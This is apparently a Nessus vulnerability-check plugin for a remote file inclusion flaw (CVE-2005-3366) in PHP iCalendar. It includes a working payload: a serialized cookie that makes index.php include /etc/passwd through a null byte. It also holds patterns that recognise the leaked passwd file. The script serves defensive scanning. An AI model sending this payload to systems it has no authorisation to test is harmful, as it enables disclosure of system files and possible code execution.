#
# (C) Tenable Network Security
#


include("compat.inc");

if (description) {
  script_id(20091);
  script_version("$Revision: 1.8 $");

  script_cve_id("CVE-2005-3366");
  script_bugtraq_id(15193);
  script_xref(name:"OSVDB", value:"20318");

  script_name(english:"PHP iCalendar index.php phpicalendar Parameter Remote File Inclusion");
  script_summary(english:"Checks for remote file inclusion vulnerability in PHP iCalendar");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to a remote
file include vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be running PHP iCalendar, a web-based iCal
file viewer / parser written in PHP. 

The version of PHP icalendar installed on the remote host fails to
sanitize the 'phpicalendar' cookie before using it in 'index.php' to
include PHP code from a separate file.  By leveraging this flaw, an
unauthenticated attacker may be able to view arbitrary files on the
remote host and execute arbitrary PHP code, possibly taken from
third-party hosts.  Successful exploitation requires that PHP's
'magic_quotes' setting be disabled, that its 'allow_url_fopen' setting
be enabled, or that an attacker be able to place PHP files on the
remote host." );
 script_set_attribute(attribute:"see_also", value:"http://lists.grok.org.uk/pipermail/full-disclosure/2005-October/038142.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to a version of PHP iCalendar later than 2.0.1 when it becomes
available." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P" );


script_end_attributes();

 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);

# What we use to get (file or partial URL).
file = "/etc/passwd%00";
exploit = urlencode(
  str:string(
    'a:1:{',
      's:11:"cookie_view";',
      's:', strlen(file), ':"', file, '";',
    '}'
  )
);


# Loop through directories.
if (thorough_tests) dirs = list_uniq("/icalendar", "/phpicalendar", "/calendar", "/ical", "/cal", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  init_cookiejar();
  set_http_cookie(name: "phpicalendar", value: exploit);
  # Try to exploit the flaw.
  r = http_send_recv3(method: "GET", item:string(dir, "/index.php"), port:port);
  if (isnull(r)) exit(0);

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string: r[2]) ||
    # we get an error saying "failed to open stream" or "Failed opening".
    #
    # nb: this suggests magic_quotes_gpc was enabled but remote file
    #     includes might still work.
    egrep(pattern:"Warning.+main\(/etc/passwd.+failed to open stream", string: r[2]) ||
    egrep(pattern:"Failed opening .*'/etc/passwd", string: r[2])
  ) {
    if (report_verbosity > 0) {
      report = string(
        r[0],r[1],'\r\n',r[2]
      );
    }
    else report = NULL;

    security_warning(port:port, extra:report);
    exit(0);
  }
}
